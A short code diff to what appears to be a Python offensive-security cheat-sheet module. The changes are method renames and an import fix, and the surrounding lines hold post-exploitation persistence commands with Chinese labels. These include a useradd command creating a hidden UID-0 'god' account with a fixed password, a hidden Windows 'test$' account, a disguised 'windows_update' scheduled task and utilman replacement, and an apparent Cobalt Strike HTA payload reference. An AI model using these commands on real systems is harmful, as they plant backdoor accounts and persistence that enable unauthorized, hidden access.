@@ -1,5 +1,5 @@
 # encoding: utf8
-from .config import *
+from config import *
 
 
 class Shell:
@@ -21,7 +21,7 @@ Step:
     3. ssh -i id_rsa root@hostname (local)
 """
 
-    def AddUser(self):
+    def linux_adduser(self):
         return """
 添加root权限账号：
     useradd -o -u 0 -M -s /bin/bash -g 0 -d /home/test god;(echo abc123;sleep 1;echo abc123) | passwd god
@@ -80,7 +80,7 @@ utilman程序替换
 删除
     schtasks /delete /f /tn windows_update
 
-""".format(cobalt_hta)
+""".format(cs_hta)
 
     def Services(self):
         """
@@ -139,7 +139,7 @@ windows隐藏文件
 
 """
 
-    def AddUser(self):
+    def windows_adduser(self):
         return """
 简单添加隐藏账号
     net user test$ 123!@#qwe /add
